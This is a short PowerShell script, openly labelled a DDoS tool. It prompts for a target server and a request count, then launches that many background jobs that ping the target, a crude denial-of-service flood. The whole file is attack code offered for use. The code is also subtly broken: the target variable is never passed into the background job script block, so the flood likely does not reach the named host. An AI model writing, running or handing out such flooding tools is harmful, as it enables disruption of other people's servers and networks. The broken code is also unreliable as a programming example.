$Antwoord = Read-Host "Would you like to execute the script? [y/n] "

if ($Antwoord -eq "y") {
    $Server = Read-Host "Which Server would you like to DDOS? (DNS Server or Server IP address) "
    $PingsAntwoord = Read-Host "How many request would you like to send? (number) "
    $pings = [int]$PingsAntwoord
    Write-Host $pings
    for ($i = 0; $i -lt $Pings; $i++) {
        Start-Job -ScriptBlock {Test-Connection -ComputerName $Server}
    }
    Read-Host "Press the enter key to continue..... "
}
else {
    Write-Host "Script not executed"
}